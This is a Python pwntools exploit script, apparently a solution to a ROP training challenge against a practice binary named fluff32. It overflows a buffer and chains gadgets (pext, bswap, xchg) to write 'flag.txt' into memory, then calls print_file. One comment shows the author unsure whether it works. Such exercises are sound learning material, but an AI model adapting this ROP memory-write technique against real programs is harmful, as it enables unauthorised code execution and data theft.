from pwn import *
elf = context.binary = ELF("./fluff32")
io = process("./fluff32")
#context.log_level = "debug"

data_addr = 0x0804a018

# populate edx
gadget_write_0 = 0x080485bb    # pop ebp ; ret
gadget_write_1 = 0x08048543   # mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret 
# populate ecx
gadget_write_2 = 0x08048558   # pop ecx; bswap ecx; ret
# write to memory
gadget_write_3 = 0x08048555   #  xchg byte [ecx], dl; ret


def find_mask(x):
    obj_bits = [1 if  x & (1 << (7-n)) else 0 for n in range(8)]
    obj_bits.reverse() # PEXT compacts from MSB to LSB

    ebx = 0xb0bababa
    mask_bits = []
    n = 0
    for i in range(ebx.bit_length()):
        if n >= len(obj_bits):
            break
        ebx_bit = (ebx >> i) & 1
        if obj_bits[n] == ebx_bit:
            mask_bits.append(1)
            n+=1
        else:
            mask_bits.append(0)
    
    mask_bits.reverse() # LSB-first to MSB-first
    mask = 0
    for bit in mask_bits:
           mask = (mask << 1) | bit
    return p32(mask)

def write_in_data(data):
    p = b""
    # Write "flag.txt"
    for i in range(len(data)):
        # Step 1
        p += p32(gadget_write_0)
        #p += p32(0) 
        p += find_mask(data[i]) # SIGILL ??? 
        p += p32(gadget_write_1)
        # Step 2
        p += p32(gadget_write_2)
        p += p32(data_addr + i,endian="big")
        # Step 3
        p += p32(gadget_write_3)
    return p

payload = b"A" * 44
payload += write_in_data(b"flag.txt")  # write "flag.txt" en .data
payload += p32(elf.plt['print_file'])  # print_file("flag.txt")
payload += p32(0)                      # ebp
payload += p32(data_addr)              # "flag.txt"

io.recv()
io.sendline(payload)
io.interactive()


